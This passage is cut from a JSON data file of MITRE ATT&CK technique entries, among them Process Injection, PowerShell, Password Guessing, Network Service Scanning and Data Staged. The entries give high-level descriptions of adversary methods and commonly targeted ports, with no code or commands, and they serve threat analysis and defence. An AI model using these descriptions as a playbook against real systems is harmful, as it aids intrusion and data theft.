\"2020-03-24T20:46:23.547Z\", \"id\": \"attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163\"}, \"attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-10-02T16:53:16.526Z\", \"name\": \"Active Scanning\", \"attack_pattern_identifier\": \"T1595\", \"description\": \"Before compromising a victim, adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\\n\\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).\", \"modified\": \"2020-10-24T04:06:50.402Z\", \"id\": \"attack-pattern--67073dde-d720-45ae-83da-b12d5e73ca3b\"}, \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:47.843Z\", \"name\": \"Process Injection\", \"attack_pattern_identifier\": \"T1055\", \"description\": \"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \\n\\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \\n\\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. \", \"modified\": \"2020-06-20T22:28:45.651Z\", \"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\"}, \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T13:48:55.078Z\", \"name\": \"PowerShell\", \"attack_pattern_identifier\": \"T1059.001\", \"modified\": \"2020-06-24T13:51:22.360Z\", \"description\": \"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\\n\\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\\n\\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\\n\\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\", \"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\"}, \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-03-16T15:33:01.739Z\", \"name\": \"Encrypted Channel\", \"attack_pattern_identifier\": \"T1573\", \"modified\": \"2020-03-30T00:37:16.809Z\", \"description\": \"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.\", \"id\": \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\"}, \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:38:24.334Z\", \"name\": \"Python\", \"attack_pattern_identifier\": \"T1059.006\", \"description\": \"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\\n\\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\", \"modified\": \"2020-06-23T19:03:15.180Z\", \"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\"}, \"attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:38:22.617Z\", \"name\": \"Password Guessing\", \"attack_pattern_identifier\": \"T1110.001\", \"description\": \"Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\\n\\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\\n\\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n\\nIn addition to management services, adversaries may \\\"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\\\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\\n\\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \\\"logon failure\\\" event ID 4625.\", \"modified\": \"2020-10-19T22:43:45.126Z\", \"id\": \"attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119\"}, \"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:24.512Z\", \"name\": \"Application Window Discovery\", \"attack_pattern_identifier\": \"T1010\", \"description\": \"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\", \"modified\": \"2020-03-26T15:44:27.068Z\", \"id\": \"attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830\"}, \"attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:43.915Z\", \"name\": \"Network Service Scanning\", \"attack_pattern_identifier\": \"T1046\", \"modified\": \"2020-03-11T19:55:53.828Z\", \"description\": \"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. \\n\\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\", \"id\": \"attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88\"}, \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:58.938Z\", \"name\": \"Data Staged\", \"attack_pattern_identifier\": \"T1074\", \"description\": \"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\\n\\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\\n\\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.\", \"modified\": \"2020-09-14T19:48:08.180Z\", \"id\": \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\"}}}"